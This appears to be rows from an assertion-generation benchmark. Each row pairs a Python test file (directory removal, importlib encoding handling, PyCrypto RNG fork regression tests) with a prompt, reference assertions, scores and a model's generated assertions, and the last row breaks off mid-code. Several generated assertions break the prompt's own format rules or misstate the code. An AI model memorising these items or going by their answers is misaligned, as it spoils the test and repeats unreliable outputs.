7	task = tasks.remove_dir_task.RemoveDirectoryTask()
8
9	def test_execute_raises_on_no_path_given(self):
10		with pytest.raises(core.task.TaskParameterException):
11			self.task.execute_task()
12
13	def test_execute_raises_on_directory_not_exists(self):
14		with pytest.raises(core.task.TaskGenericException):
15			self.task.execute_task({'path': 'test/non_existing_directory'})
16
17	def test_execute_removes_directory(self):
18		os.mkdir('test/non_existing_directory')
19
20		self.task.execute_task({'path': 'test/non_existing_directory'})
21		exists = os.path.exists('test/non_existing_directory')
22
23		if os.path.exists('test/non_existing_directory'):
24			os.rmdir('test/non_existing_directory')
25
26","[['exists', '==', 'False']]",1,1,1.0,0.0012406947890818,"['task', 'exists']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['task', 'exists']
*Code:

1import core.task
2import os
3import pytest
4import tasks.remove_dir_task
5
6class TestRemoveDirectoryTask(object):
7	task = tasks.remove_dir_task.RemoveDirectoryTask()
8
9	def test_execute_raises_on_no_path_given(self):
10		with pytest.raises(core.task.TaskParameterException):
11			self.task.execute_task()
12
13	def test_execute_raises_on_directory_not_exists(self):
14		with pytest.raises(core.task.TaskGenericException):
15			self.task.execute_task({'path': 'test/non_existing_directory'})
16
17	def test_execute_removes_directory(self):
18		os.mkdir('test/non_existing_directory')
19
20		self.task.execute_task({'path': 'test/non_existing_directory'})
21		exists = os.path.exists('test/non_existing_directory')
22
23		if os.path.exists('test/non_existing_directory'):
24			os.rmdir('test/non_existing_directory')
25
26",2223,"[[9, 'task', '!=', None, ""task shouldn't be None before execution""],
 [17, 'exists', '==', False, ""directory should not exist after task execution""],
 [23, 'exists', '==', False, ""directory should not exist after removal""]]"
MalloyPower/parsing-python,"from importlib import _bootstrap
from . import util as source_util

import codecs
import re
import sys
# Because sys.path gets essentially blanked, need to have unicodedata already
# imported for the parser to use.
import unicodedata
import unittest


CODING_RE = re.compile(r'coding[:=]\s*([-\w.]+)')


class EncodingTest(unittest.TestCase):

    """"""PEP 3120 makes UTF-8 the default encoding for source code
    [default encoding].

    PEP 263 specifies how that can change on a per-file basis. Either the first
    or second line can contain the encoding line [encoding first line]
    encoding second line]. If the file has the BOM marker it is considered UTF-8
    implicitly [BOM]. If any encoding is specified it must be UTF-8, else it is
    an error [BOM and utf-8][BOM conflict].

    """"""

    variable = '\u00fc'
    character = '\u00c9'
    source_line = ""{0} = '{1}'\n"".format(variable, character)
    module_name = '_temp'

    def run_test(self, source):
        with source_util.create_modules(self.module_name) as mapping:
            with open(mapping[self.module_name], 'wb')as file:
                file.write(source)
            loader = _bootstrap._PyPycFileLoader(self.module_name,
                                       mapping[self.module_name], False)
            return loader.load_module(self.module_name)

    def create_source(self, encoding):
        encoding_line = ""# coding={0}"".format(encoding)
        assert CODING_RE.search(encoding_line)
        source_lines = [encoding_line.encode('utf-8')]
        source_lines.append(self.source_line.encode(encoding))
        return b'\n'.join(source_lines)

    def test_non_obvious_encoding(self):
        # Make sure that an encoding that has never been a standard one for
        # Python works.
        encoding_line = ""# coding=koi8-r""
        assert CODING_RE.search(encoding_line)
        source = ""{0}\na=42\n"".format(encoding_line).encode(""koi8-r"")
        self.run_test(source)

    # [default encoding]
    def test_default_encoding(self):
        self.run_test(self.source_line.encode('utf-8'))

    # [encoding first line]
    def test_encoding_on_first_line(self):
        encoding = 'Latin-1'
        source = self.create_source(encoding)
        self.run_test(source)

    # [encoding second line]
    def test_encoding_on_second_line(self):
        source = b""#/usr/bin/python\n"" + self.create_source('Latin-1')
        self.run_test(source)

    # [BOM]
    def test_bom(self):
        self.run_test(codecs.BOM_UTF8 + self.source_line.encode('utf-8'))

    # [BOM and utf-8]
    def test_bom_and_utf_8(self):
        source = codecs.BOM_UTF8 + self.create_source('utf-8')
        self.run_test(source)

    # [BOM conflict]
    def test_bom_conflict(self):
        source = codecs.BOM_UTF8 + self.create_source('latin-1')
        self.assertRaises(SyntaxError, self.run_test, source)


class LineEndingTest(unittest.TestCase):

    r""""""Source written with the three types of line endings (\n, \r\n, \r)
    need to be readable [cr][crlf][lf].""""""

    def run_test(self, line_ending):
        module_name = '_temp'
        source_lines = [b""a = 42"", b""b = -13"", b'']
        source = line_ending.join(source_lines)
        with source_util.create_modules(module_name) as mapping:
            with open(mapping[module_name], 'wb') as file:
                file.write(source)
            loader = _bootstrap._PyPycFileLoader(module_name,
                                                 mapping[module_name], False)
            return loader.load_module(module_name)

    # [cr]
    def test_cr(self):
        self.run_test(b'\r')

    # [crlf]
    def test_crlf(self):
        self.run_test(b'\r\n')

    # [lf]
    def test_lf(self):
        self.run_test(b'\n')


def test_main():
    from test.support import run_unittest
    run_unittest(EncodingTest, LineEndingTest)


if __name__ == '__main__':
    test_main()
","
1from importlib import _bootstrap
2from . import util as source_util
3
4import codecs
5import re
6import sys
7# Because sys.path gets essentially blanked, need to have unicodedata already
8# imported for the parser to use.
9import unicodedata
10import unittest
11
12
13CODING_RE = re.compile(r'coding[:=]\s*([-\w.]+)')
14
15
16class EncodingTest(unittest.TestCase):
17
18    """"""PEP 3120 makes UTF-8 the default encoding for source code
19    [default encoding].
20
21    PEP 263 specifies how that can change on a per-file basis. Either the first
22    or second line can contain the encoding line [encoding first line]
23    encoding second line]. If the file has the BOM marker it is considered UTF-8
24    implicitly [BOM]. If any encoding is specified it must be UTF-8, else it is
25    an error [BOM and utf-8][BOM conflict].
26
27    """"""
28
29    variable = '\u00fc'
30    character = '\u00c9'
31    source_line = ""{0} = '{1}'\n"".format(variable, character)
32    module_name = '_temp'
33
34    def run_test(self, source):
35        with source_util.create_modules(self.module_name) as mapping:
36            with open(mapping[self.module_name], 'wb')as file:
37                file.write(source)
38            loader = _bootstrap._PyPycFileLoader(self.module_name,
39                                       mapping[self.module_name], False)
40            return loader.load_module(self.module_name)
41
42    def create_source(self, encoding):
43        encoding_line = ""# coding={0}"".format(encoding)
44        source_lines = [encoding_line.encode('utf-8')]
45        source_lines.append(self.source_line.encode(encoding))
46        return b'\n'.join(source_lines)
47
48    def test_non_obvious_encoding(self):
49        # Make sure that an encoding that has never been a standard one for
50        # Python works.
51        encoding_line = ""# coding=koi8-r""
52        source = ""{0}\na=42\n"".format(encoding_line).encode(""koi8-r"")
53        self.run_test(source)
54
55    # [default encoding]
56    def test_default_encoding(self):
57        self.run_test(self.source_line.encode('utf-8'))
58
59    # [encoding first line]
60    def test_encoding_on_first_line(self):
61        encoding = 'Latin-1'
62        source = self.create_source(encoding)
63        self.run_test(source)
64
65    # [encoding second line]
66    def test_encoding_on_second_line(self):
67        source = b""#/usr/bin/python\n"" + self.create_source('Latin-1')
68        self.run_test(source)
69
70    # [BOM]
71    def test_bom(self):
72        self.run_test(codecs.BOM_UTF8 + self.source_line.encode('utf-8'))
73
74    # [BOM and utf-8]
75    def test_bom_and_utf_8(self):
76        source = codecs.BOM_UTF8 + self.create_source('utf-8')
77        self.run_test(source)
78
79    # [BOM conflict]
80    def test_bom_conflict(self):
81        source = codecs.BOM_UTF8 + self.create_source('latin-1')
82
83
84class LineEndingTest(unittest.TestCase):
85
86    r""""""Source written with the three types of line endings (\n, \r\n, \r)
87    need to be readable [cr][crlf][lf].""""""
88
89    def run_test(self, line_ending):
90        module_name = '_temp'
91        source_lines = [b""a = 42"", b""b = -13"", b'']
92        source = line_ending.join(source_lines)
93        with source_util.create_modules(module_name) as mapping:
94            with open(mapping[module_name], 'wb') as file:
95                file.write(source)
96            loader = _bootstrap._PyPycFileLoader(module_name,
97                                                 mapping[module_name], False)
98            return loader.load_module(module_name)
99
100    # [cr]
101    def test_cr(self):
102        self.run_test(b'\r')
103
104    # [crlf]
105    def test_crlf(self):
106        self.run_test(b'\r\n')
107
108    # [lf]
109    def test_lf(self):
110        self.run_test(b'\n')
111
112
113def test_main():
114    from test.support import run_unittest
115    run_unittest(EncodingTest, LineEndingTest)
116
117
118if __name__ == '__main__':
119    test_main()
120","[['CODING_RE.search(encoding_line)', '==', 'True'], ['CODING_RE.search(encoding_line)', '==', 'True']]",3,2,0.6666666666666666,0.0005113781641523,"['CODING_RE', 'variable', 'character', 'source_line', 'module_name', 'source', 'loader', 'encoding', 'encoding_line', 'source_lines', 'line_ending']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['CODING_RE', 'variable', 'character', 'source_line', 'module_name', 'source', 'loader', 'encoding', 'encoding_line', 'source_lines', 'line_ending']
*Code:

1from importlib import _bootstrap
2from . import util as source_util
3
4import codecs
5import re
6import sys
7# Because sys.path gets essentially blanked, need to have unicodedata already
8# imported for the parser to use.
9import unicodedata
10import unittest
11
12
13CODING_RE = re.compile(r'coding[:=]\s*([-\w.]+)')
14
15
16class EncodingTest(unittest.TestCase):
17
18    """"""PEP 3120 makes UTF-8 the default encoding for source code
19    [default encoding].
20
21    PEP 263 specifies how that can change on a per-file basis. Either the first
22    or second line can contain the encoding line [encoding first line]
23    encoding second line]. If the file has the BOM marker it is considered UTF-8
24    implicitly [BOM]. If any encoding is specified it must be UTF-8, else it is
25    an error [BOM and utf-8][BOM conflict].
26
27    """"""
28
29    variable = '\u00fc'
30    character = '\u00c9'
31    source_line = ""{0} = '{1}'\n"".format(variable, character)
32    module_name = '_temp'
33
34    def run_test(self, source):
35        with source_util.create_modules(self.module_name) as mapping:
36            with open(mapping[self.module_name], 'wb')as file:
37                file.write(source)
38            loader = _bootstrap._PyPycFileLoader(self.module_name,
39                                       mapping[self.module_name], False)
40            return loader.load_module(self.module_name)
41
42    def create_source(self, encoding):
43        encoding_line = ""# coding={0}"".format(encoding)
44        source_lines = [encoding_line.encode('utf-8')]
45        source_lines.append(self.source_line.encode(encoding))
46        return b'\n'.join(source_lines)
47
48    def test_non_obvious_encoding(self):
49        # Make sure that an encoding that has never been a standard one for
50        # Python works.
51        encoding_line = ""# coding=koi8-r""
52        source = ""{0}\na=42\n"".format(encoding_line).encode(""koi8-r"")
53        self.run_test(source)
54
55    # [default encoding]
56    def test_default_encoding(self):
57        self.run_test(self.source_line.encode('utf-8'))
58
59    # [encoding first line]
60    def test_encoding_on_first_line(self):
61        encoding = 'Latin-1'
62        source = self.create_source(encoding)
63        self.run_test(source)
64
65    # [encoding second line]
66    def test_encoding_on_second_line(self):
67        source = b""#/usr/bin/python\n"" + self.create_source('Latin-1')
68        self.run_test(source)
69
70    # [BOM]
71    def test_bom(self):
72        self.run_test(codecs.BOM_UTF8 + self.source_line.encode('utf-8'))
73
74    # [BOM and utf-8]
75    def test_bom_and_utf_8(self):
76        source = codecs.BOM_UTF8 + self.create_source('utf-8')
77        self.run_test(source)
78
79    # [BOM conflict]
80    def test_bom_conflict(self):
81        source = codecs.BOM_UTF8 + self.create_source('latin-1')
82
83
84class LineEndingTest(unittest.TestCase):
85
86    r""""""Source written with the three types of line endings (\n, \r\n, \r)
87    need to be readable [cr][crlf][lf].""""""
88
89    def run_test(self, line_ending):
90        module_name = '_temp'
91        source_lines = [b""a = 42"", b""b = -13"", b'']
92        source = line_ending.join(source_lines)
93        with source_util.create_modules(module_name) as mapping:
94            with open(mapping[module_name], 'wb') as file:
95                file.write(source)
96            loader = _bootstrap._PyPycFileLoader(module_name,
97                                                 mapping[module_name], False)
98            return loader.load_module(module_name)
99
100    # [cr]
101    def test_cr(self):
102        self.run_test(b'\r')
103
104    # [crlf]
105    def test_crlf(self):
106        self.run_test(b'\r\n')
107
108    # [lf]
109    def test_lf(self):
110        self.run_test(b'\n')
111
112
113def test_main():
114    from test.support import run_unittest
115    run_unittest(EncodingTest, LineEndingTest)
116
117
118if __name__ == '__main__':
119    test_main()
120",5536,"[[13, 'CODING_RE', '!=', None, 'Ensure the regex is properly compiled'],
 [34, 'source', '!=', None, 'Ensure the source code exists'],
 [43, 'encoding', '!=', None, 'Ensure an encoding value is specified'],
 [44, 'source_lines', '==', 1, 'Initial source_lines should contain a single encoding_line'],
 [49, 'encoding_line', '!=', None, 'Ensure non-standard encoding value is properly constructed'],
 [57, 'self.source_line', '!=', None, 'Ensure a source_line is created for the default encoding test'],
 [66, 'source', '!=', None, 'Ensure source is created with first line encoding'],
 [75, 'source', '!=', None, 'Ensure source is created with utf-8 encoding'],
 [80, 'source', '!=', None, 'Ensure source is created with latin-1 encoding causing BOM conflict'],
 [89, 'line_ending', '!=', None, 'Ensure line_ending value is specified'],
 [91, 'source_lines', '==', 3, 'Ensure there are initial 3 source_lines for LineEndingTest']]"
epssy/hue,"# -*- coding: utf-8 -*-
# Self-tests for the user-friendly Crypto.Random interface
#
# Written in 2013 by Dwayne C. Litzenberger <dlitz@dlitz.net>
#
# ===================================================================
# The contents of this file are dedicated to the public domain.  To
# the extent that dedication to the public domain is not available,
# everyone is granted a worldwide, perpetual, royalty-free,
# non-exclusive license to exercise all rights associated with the
# contents of this file for any purpose whatsoever.
# No rights are reserved.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# ===================================================================

""""""Self-test suite for generic Crypto.Random stuff """"""

from __future__ import nested_scopes

__revision__ = ""$Id$""

import binascii
import pprint
import unittest
import os
import time
import sys
if sys.version_info[0] == 2 and sys.version_info[1] == 1:
    from Crypto.Util.py21compat import *
from Crypto.Util.py3compat import *

try:
    import multiprocessing
except ImportError:
    multiprocessing = None

import Crypto.Random._UserFriendlyRNG
import Crypto.Random.random

class RNGForkTest(unittest.TestCase):

    def _get_reseed_count(self):
        """"""
        Get `FortunaAccumulator.reseed_count`, the global count of the
        number of times that the PRNG has been reseeded.
        """"""
        rng_singleton = Crypto.Random._UserFriendlyRNG._get_singleton()
        rng_singleton._lock.acquire()
        try:
            return rng_singleton._fa.reseed_count
        finally:
            rng_singleton._lock.release()

    def runTest(self):
        # Regression test for CVE-2013-1445.  We had a bug where, under the
        # right conditions, two processes might see the same random sequence.

        if sys.platform.startswith('win'):  # windows can't fork
            assert not hasattr(os, 'fork')    # ... right?
            return

        # Wait 150 ms so that we don't trigger the rate-limit prematurely.
        time.sleep(0.15)

        reseed_count_before = self._get_reseed_count()

        # One or both of these calls together should trigger a reseed right here.
        Crypto.Random._UserFriendlyRNG._get_singleton().reinit()
        Crypto.Random.get_random_bytes(1)

        reseed_count_after = self._get_reseed_count()
        self.assertNotEqual(reseed_count_before, reseed_count_after)  # sanity check: test should reseed parent before forking

        rfiles = []
        for i in range(10):
            rfd, wfd = os.pipe()
            if os.fork() == 0:
                # child
                os.close(rfd)
                f = os.fdopen(wfd, ""wb"")

                Crypto.Random.atfork()

                data = Crypto.Random.get_random_bytes(16)

                f.write(data)
                f.close()
                os._exit(0)
            # parent
            os.close(wfd)
            rfiles.append(os.fdopen(rfd, ""rb""))

        results = []
        results_dict = {}
        for f in rfiles:
            data = binascii.hexlify(f.read())
            results.append(data)
            results_dict[data] = 1
            f.close()

        if len(results) != len(results_dict.keys()):
            raise AssertionError(""RNG output duplicated across fork():\n%s"" %
                                 (pprint.pformat(results)))


# For RNGMultiprocessingForkTest
def _task_main(q):
    a = Crypto.Random.get_random_bytes(16)
    time.sleep(0.1)     # wait 100 ms
    b = Crypto.Random.get_random_bytes(16)
    q.put(binascii.b2a_hex(a))
    q.put(binascii.b2a_hex(b))
    q.put(None)      # Wait for acknowledgment


class RNGMultiprocessingForkTest(unittest.TestCase):

    def runTest(self):
        # Another regression test for CVE-2013-1445.  This is basically the
        # same as RNGForkTest, but less compatible with old versions of Python,
        # and a little easier to read.

        n_procs = 5
        manager = multiprocessing.Manager()
        queues = [manager.Queue(1) for i in range(n_procs)]

        # Reseed the pool
        time.sleep(0.15)
        Crypto.Random._UserFriendlyRNG._get_singleton().reinit()
        Crypto.Random.get_random_bytes(1)

        # Start the child processes
        pool = multiprocessing.Pool(processes=n_procs, initializer=Crypto.Random.atfork)
        map_result = pool.map_async(_task_main, queues)

        # Get the results, ensuring that no pool processes are reused.
        aa = [queues[i].get(30) for i in range(n_procs)]
        bb = [queues[i].get(30) for i in range(n_procs)]
        res = list(zip(aa, bb))

        # Shut down the pool
        map_result.get(30)
        pool.close()
        pool.join()

        # Check that the results are unique
        if len(set(aa)) != len(aa) or len(set(res)) != len(res):
            raise AssertionError(""RNG output duplicated across fork():\n%s"" %
                                 (pprint.pformat(res),))


def get_tests(config={}):
    tests = []
    tests += [RNGForkTest()]
    if multiprocessing is not None:
        tests += [RNGMultiprocessingForkTest()]
    return tests

if __name__ == '__main__':
    suite = lambda: unittest.TestSuite(get_tests())
    unittest.main(defaultTest='suite')

# vim:set ts=4 sw=4 sts=4 expandtab:
","
1# -*- coding: utf-8 -*-
2# Self-tests for the user-friendly Crypto.Random interface
3#
4# Written in 2013 by Dwayne C. Litzenberger <dlitz@dlitz.net>
5#
6# ===================================================================
7# The contents of this file are dedicated to the public domain.  To
8# the extent that dedication to the public domain is not available,
9# everyone is granted a worldwide, perpetual, royalty-free,
10# non-exclusive license to exercise all rights associated with the
11# contents of this file for any purpose whatsoever.
12# No rights are reserved.
13#
14# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
15# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
16# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
17# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
18# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
19# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
20# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
21# SOFTWARE.
22# ===================================================================
23
24""""""Self-test suite for generic Crypto.Random stuff """"""
25
26from __future__ import nested_scopes
27
28__revision__ = ""$Id$""
29
30import binascii
31import pprint
32import unittest
33import os
34import time
35import sys
36if sys.version_info[0] == 2 and sys.version_info[1] == 1:
37    from Crypto.Util.py21compat import *
38from Crypto.Util.py3compat import *
39
40try:
41    import multiprocessing
42except ImportError:
43    multiprocessing = None
44
45import Crypto.Random._UserFriendlyRNG
46import Crypto.Random.random
47
48class RNGForkTest(unittest.TestCase):
49
50    def _get_reseed_count(self):
51        """"""
52        Get `FortunaAccumulator.reseed_count`, the global count of the
53        number of times that the PRNG has been reseeded.
54        """"""
55        rng_singleton = Crypto.Random._UserFriendlyRNG._get_singleton()
56        rng_singleton._lock.acquire()
57        try:
58            return rng_singleton._fa.reseed_count
59        finally:
60            rng_singleton._lock.release()
61
62    def runTest(self):
63        # Regression test for CVE-2013-1445.  We had a bug where, under the
64        # right conditions, two processes might see the same random sequence.
65
66        if sys.platform.startswith('win'):  # windows can't fork
67            return
68
69        # Wait 150 ms so that we don't trigger the rate-limit prematurely.
70        time.sleep(0.15)
71
72        reseed_count_before = self._get_reseed_count()
73
74        # One or both of these calls together should trigger a reseed right here.
75        Crypto.Random._UserFriendlyRNG._get_singleton().reinit()
76        Crypto.Random.get_random_bytes(1)
77
78        reseed_count_after = self._get_reseed_count()
79
80        rfiles = []
81        for i in range(10):
82            rfd, wfd = os.pipe()
83            if os.fork() == 0:
84                # child
85                os.close(rfd)
86                f = os.fdopen(wfd, ""wb"")
87
88                Crypto.Random.atfork()
89
90                data = Crypto.Random.get_random_bytes(16)
91
92                f.write(data)
93                f.close()
94                os._exit(0)
95            # parent
96            os.close(wfd)
97            rfiles.append(os.fdopen(rfd, ""rb""))
98
99        results = []
100        results_dict = {}
101        for f in rfiles:
102            data = binascii.hexlify(f.read())
103            results.append(data)
104            results_dict[data] = 1
105            f.close()
106
107        if len(results) != len(results_dict.keys()):
108            raise AssertionError(""RNG output duplicated across fork():\n%s"" %
109                                 (pprint.pformat(results)))
110
111
112# For RNGMultiprocessingForkTest
113def _task_main(q):
114    a = Crypto.Random.get_random_bytes(16)
115    time.sleep(0.1)     # wait 100 ms
116    b = Crypto.Random.get_random_bytes(16)
117    q.put(binascii.b2a_hex(a))
118    q.put(binascii.b2a_hex(b))
119    q.put(None)      # Wait for acknowledgment
120
121
122class RNGMultiprocessingForkTest(unittest.TestCase):
123
124    def runTest(self):
125        # Another regression test for CVE-2013-1445.  This is basically the
126        # same as RNGForkTest, but less compatible with old versions of Python,
127        # and a little easier to read.
128
129        n_procs = 5
130        manager = multiprocessing.Manager()
131        queues = [manager.Queue(1) for i in range(n_procs)]
132
133        # Reseed the pool
134        time.sleep(0.15)
135        Crypto.Random._UserFriendlyRNG._get_singleton().reinit()
136        Crypto.Random.get_random_bytes(1)
137
138        # Start the child processes
139        pool = multiprocessing.Pool(processes=n_procs, initializer=Crypto.Random.atfork)
140        map_result = pool.map_async(_task_main, queues)
141
142        # Get the results, ensuring that no pool processes are reused.
143        aa = [queues[i].get(30) for i in range(n_procs)]
144        bb = [queues[i].get(30) for i in range(n_procs)]
145        res = list(zip(aa, bb))
146
147        # Shut down the pool
148        map_result.get(30)
149        pool.close()
150        pool.join()
151
152        # Check that the results are unique
153        if len(set(aa)) != len(aa) or len(set(res)) != len(res):
154            raise AssertionError(""RNG output duplicated across fork():\n%s"" %
155                                 (pprint.pformat(res),))
156
157
158def get_tests(config={}):
159    tests = []
160    tests += [RNGForkTest()]
161    if multiprocessing is not None:
162        tests += [RNGMultiprocessingForkTest()]
163    return tests
164
165if __name__ == '__main__':
166    suite = lambda: unittest.TestSuite(get_tests())
167    unittest.main(defaultTest='suite')
168
169# vim:set ts=4 sw=4 sts=4 expandtab:
170","[['hasattr(os', '==', 'False']]",2,1,0.5,0.0001753770606804,"['__revision__', 'multiprocessing', 'rng_singleton', 'reseed_count_before', 'reseed_count_after', 'rfiles', 'rfd', 'wfd', 'f', 'data', 'results', 'results_dict', 'results_dict[data]', 'q', 'a', 'b', 'n_procs', 'manager', 'queues', 'pool', 'map_result', 'aa', 'bb', 'res', 'config', 'tests', 'suite']",27,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__revision__', 'multiprocessing', 'rng_singleton', 'reseed_count_before', 'reseed_count_after', 'rfiles', 'rfd', 'wfd', 'f', 'data', 'results', 'results_dict', 'results_dict[data]', 'q', 'a', 'b', 'n_procs', 'manager', 'queues', 'pool', 'map_result', 'aa', 'bb', 'res', 'config', 'tests', 'suite']
*Code:

1# -*- coding: utf-8 -*-
2# Self-tests for the user-friendly Crypto.Random interface
3#
4# Written in 2013 by Dwayne C. Litzenberger <dlitz@dlitz.net>
5#
6# ===================================================================
7# The contents of this file are dedicated to the public domain.  To
8# the extent that dedication to the public domain is not available,
9# everyone is granted a worldwide, perpetual, royalty-free,
10# non-exclusive license to exercise all rights associated with the
11# contents of this file for any purpose whatsoever.
12# No rights are reserved.
13#
14# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
15# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
16# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
17# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
18# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
19# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
20# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
21# SOFTWARE.
22# ===================================================================
23
24""""""Self-test suite for generic Crypto.Random stuff """"""
25
26from __future__ import nested_scopes
27
28__revision__ = ""$Id$""
29
30import binascii
31import pprint
32import unittest
33import os
34import time
35import sys
36if sys.version_info[0] == 2 and sys.version_info[1] == 1:
37    from Crypto.Util.py21compat import *
38from Crypto.Util.py3compat import *
39
40try:
41    import multiprocessing
42except ImportError:
43    multiprocessing = None
44
45import Crypto.Random._UserFriendlyRNG
46import Crypto.Random.random
47
48class RNGForkTest(unittest.TestCase):
49
50    def _get_reseed_count(self):
51        """"""
52        Get `FortunaAccumulator.reseed_count`, the global count of the
53        number of times that the PRNG has been reseeded.
54        """"""
55        rng_singleton = Crypto.Random._UserFriendlyRNG._get_singleton()
56        rng_singleton._lock.acquire()
57        try:
58            return rng_singleton._fa.reseed_count
59        finally:
60            rng_singleton._lock.release()
61
62    def runTest(self):
63        # Regression test for CVE-2013-1445.  We had a bug where, under the
64        # right conditions, two processes might see the same random sequence.
65
66        if sys.platform.startswith('win'):  # windows can't fork
67            return
68
69        # Wait 150 ms so that we don't trigger the rate-limit prematurely.
70        time.sleep(0.15)
71
72        reseed_count_before = self._get_reseed_count()
73
74        # One or both of these calls together should trigger a reseed right here.
75        Crypto.Random._UserFriendlyRNG._get_singleton().reinit()
76        Crypto.Random.get_random_bytes(1)
77
78        reseed_count_after = self._get_reseed_count()
79
80        rfiles = []
81        for i in range(10):
82            rfd, wfd = os.pipe()
83            if os.fork() == 0:
84                # child
85                os.close(rfd)
86                f = os.fdopen(wfd, ""wb"")
87
88                Crypto.Random.atfork()
89
90                data = Crypto.Random.get_random_bytes(16)
91
92                f.write(data)
93                f.close()
94                os._exit(0)
95            # parent
96            os.close(wfd)
97            rfiles.append(os.fdopen(rfd, ""rb""))
98
99        results = []
100        results_dict = {}
101        for f in rfiles:
102            data = binascii.hexlify(f.read())
103            results.append(data)
104            results_dict[data] = 1
105            f.close()
106
107        if len(results) != len(results_dict.keys()):
108            raise AssertionError(""RNG output duplicated across fork():\n%s"" %
109                                 (pprint.pformat(results)))
110
111
112# For RNGMultiprocessingForkTest
113def _task_main(q):
114    a = Crypto.Random.get_random_bytes(16)
115    time.sleep(0.1)     # wait 100 ms
116    b = Crypto.Random.get_random_bytes(16)
117    q.put(binascii.b2a_hex(a))
118    q.put(binascii.b2a_hex(b))
119    q.put(None)      # Wait for acknowledgment
120
121
122class RNGMultiprocessingForkTest(unittest.TestCase):
123
124    def runTest(self):
125        # Another regression test for CVE-2013-1445.  This is basically the
126        # same as RNGForkTest, but less compatible with old versions of Python,
127        # and a little easier to read.
128
129        n_procs = 5
130        manager = multiprocessing.Manager()
131        queues = [manager.Queue(1) for i in range(n_procs)]
132
133        # Reseed the pool
134        time.sleep(0.15)
135        Crypto.Random._UserFriendlyRNG._get_singleton().reinit()
136        Crypto.Random.get_random_bytes(1)
137
138        # Start the child processes
139        pool = multiprocessing.Pool(processes=n_procs, initializer=Crypto.Random.atfork)
140        map_result = pool.map_async(_task_main, queues)
141
142        # Get the results, ensuring that no pool processes are reused.
143        aa = [queues[i].get(30) for i in range(n_procs)]
